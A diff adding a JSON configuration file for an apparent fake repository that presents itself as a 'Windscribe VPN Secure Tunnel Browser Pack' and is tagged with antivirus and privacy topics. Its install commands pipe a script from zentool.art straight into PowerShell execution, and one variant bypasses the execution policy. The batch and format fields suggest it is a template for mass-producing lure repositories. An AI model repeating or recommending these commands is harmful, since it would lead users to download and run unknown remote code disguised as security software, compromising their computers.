@@ -1,0 +1,28 @@
+{
+  "repo": "Windscribe-VPN-Secure-Tunnel-Browser-Pack",
+  "product": "Windscribe VPN Secure Tunnel Browser Pack",
+  "product_title": "Windscribe VPN Secure Tunnel Browser Pack",
+  "kind": "security",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "security",
+  "topics": [
+    "windscribe-vpn-secure-tunnel-browser-pack-windows",
+    "windscribe-config",
+    "windscribe-integration",
+    "windscribe-latest",
+    "endpoint-security",
+    "malware-protection",
+    "windows-security",
+    "privacy-tools",
+    "antivirus-windows",
+    "threat-protection",
+    "security-suite",
+    "real-time-protection"
+  ],
+  "site": "zentool.art"
+}
